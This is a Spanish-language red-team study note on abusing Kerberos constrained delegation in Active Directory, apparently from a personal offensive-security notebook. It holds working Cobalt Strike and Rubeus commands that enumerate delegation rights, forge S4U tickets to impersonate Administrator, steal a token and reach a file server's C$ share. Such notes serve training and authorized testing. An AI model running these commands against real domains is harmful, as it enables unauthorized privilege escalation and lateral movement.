---
tags: [ad, kerberos, delegation, s4u, constrained-delegation]
status: completo
---

# Constrained Delegation

> Un servicio puede pedir tickets en nombre de un usuario, pero **solo para los SPNs de `msDS-AllowedToDelegateTo`**.

**S4U2proxy** — el servicio pide un ST para otro servicio en nombre del usuario.  
**S4U2self** — el servicio se saca un ST para sí mismo (cuando el usuario autenticó por NTLM, no Kerberos). Requiere flag `TRUSTED_TO_AUTH_FOR_DELEGATION`.

---

## Enumeración

```
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

```powershell
# ¿Tiene protocol transition?
[System.Convert]::ToBoolean(<UAC_value> -band 16777216)
# True = TRUSTED_TO_AUTH_FOR_DELEGATION activo
```

---

## Ataque con Protocol Transition activo

> Puedes impersonar a **cualquier usuario** del dominio.

```
beacon> execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_b64> /impersonateuser:Administrator /nowrap
```

```
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<ST_b64>
beacon> steal_token <PID>
beacon> ls \\lon-fs-1\c$
```

---

## Ataque sin Protocol Transition

> Solo puedes impersonar a usuarios que ya tienen un ST para el front-end service. Captúralo primero.

```
# /tgs en vez de /impersonateuser
beacon> execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_b64> /tgs:<ST_capturado_b64> /nowrap
```

> ⚠️ Bronze Bit (CVE-2020-17049) permitía falsificar el bit forwardable. **Parchado.**

---

## Decisión rápida

```
¿TRUSTED_TO_AUTH_FOR_DELEGATION activo?
  SÍ → /impersonateuser:Administrator (cualquier usuario)
  NO → Capturar ST de un usuario real → /tgs:<ST>
```

---

## Ver también

- [[05-ad-attacks/kerberos|Kerberos]]
- [[05-ad-attacks/kerberos/unconstrained-delegation|Unconstrained Delegation]]
- [[05-ad-attacks/kerberos/rbcd|RBCD]]
- [[05-ad-attacks/kerberos/service-name-substitution-(cs)|Service Name Substitution (CS)]] — si msDS-AllowedToDelegateTo tiene solo SPNs inútiles
